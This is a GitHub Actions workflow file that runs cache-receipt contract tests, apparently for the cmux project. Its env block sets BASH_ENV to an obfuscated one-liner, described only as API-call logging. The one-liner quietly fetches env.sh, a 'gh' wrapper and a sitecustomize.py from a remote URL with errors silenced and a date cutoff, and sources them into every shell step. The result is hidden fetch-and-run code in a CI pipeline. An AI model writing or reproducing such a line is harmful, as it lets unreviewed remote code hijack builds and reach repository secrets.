name: CI cache receipt contract

on:
  pull_request:
    paths:
      - .github/actions/cache-restore/action.yml
      - .github/actions/cache-save/action.yml
      - .github/workflows/ci.yml
      - .github/workflows/ci-macos.yml
      - .github/workflows/nightly.yml
      - .github/workflows/seed-derived-data.yml
      - .github/workflows/ci-cache-receipts.yml
      - scripts/ci/cache_restore_receipt.py
      - scripts/check-test-determinism.py
      - tests/test_ci_cache_restore_receipt.py
      - tests/test_ci_pull_request_caches_are_read_only.py
  push:
    branches: [main]
    paths:
      - .github/actions/cache-restore/action.yml
      - .github/actions/cache-save/action.yml
      - .github/workflows/ci.yml
      - .github/workflows/ci-macos.yml
      - .github/workflows/nightly.yml
      - .github/workflows/seed-derived-data.yml
      - .github/workflows/ci-cache-receipts.yml
      - scripts/ci/cache_restore_receipt.py
      - scripts/check-test-determinism.py
      - tests/test_ci_cache_restore_receipt.py
      - tests/test_ci_pull_request_caches_are_read_only.py

permissions:
  contents: read

concurrency:
  group: ci-cache-receipts-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

env:
  # Temporary REST budget attribution: one gh-call line per GitHub API call (scripts/ci/api_call_log/env.sh, fetched at a fixed commit when the checkout has no copy).
  BASH_ENV: '$({ w="${GITHUB_WORKSPACE:-/nonexistent}/scripts/ci/api_call_log/env.sh"; t="${RUNNER_TEMP:-/nonexistent}/api-call-log-src"; if [ -f "$w" ]; then echo "$w"; elif [ -n "${RUNNER_TEMP:-}" ]; then if [ ! -f "$t/env.sh" ] && [ ! -e "$t.tried" ] && { [ "${RUNNER_OS:-}" = Linux ] || [ "${RUNNER_OS:-}" = macOS ]; } && [ "$(date -u +%Y%m%d%H)" -lt 2026112300 ]; then : > "$t.tried"; mkdir -p "$t.part" && for x in env.sh gh sitecustomize.py isolated.py; do curl -fsSL --max-time 5 -o "$t.part/$x" "https://raw.githubusercontent.com/manaflow-ai/cmux/27647ffd3ae838c63be28ca3e5883dcd68c34518/scripts/ci/api_call_log/$x" || break; done; [ -s "$t.part/isolated.py" ] && mv "$t.part" "$t"; fi; if [ -f "$t/env.sh" ]; then echo "$t/env.sh"; else echo unset BASH_ENV > "$t.off.sh" && echo "$t.off.sh"; fi; fi; } 2>/dev/null)'

jobs:
  receipt-contract:
    runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name != github.repository && 'ubuntu-24.04' || vars.CI_OVERFLOW_LINUX || 'cmux-linux' }}
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
        with:
          persist-credentials: false
      - name: Prepare receipt-test Python
        run: |
          set -euo pipefail
          python3 -m venv "$RUNNER_TEMP/cache-receipt-venv"
          "$RUNNER_TEMP/cache-receipt-venv/bin/python" -m pip install \
            --disable-pip-version-check \
            --no-input \
            PyYAML==6.0.3
          echo "CACHE_RECEIPT_PYTHON=$RUNNER_TEMP/cache-receipt-venv/bin/python" >> "$GITHUB_ENV"
      - run: |
          "$CACHE_RECEIPT_PYTHON" tests/test_ci_cache_restore_receipt.py
      - run: |
          "$CACHE_RECEIPT_PYTHON" scripts/check-test-determinism.py --roots tests/test_ci_cache_restore_receipt.py --strict
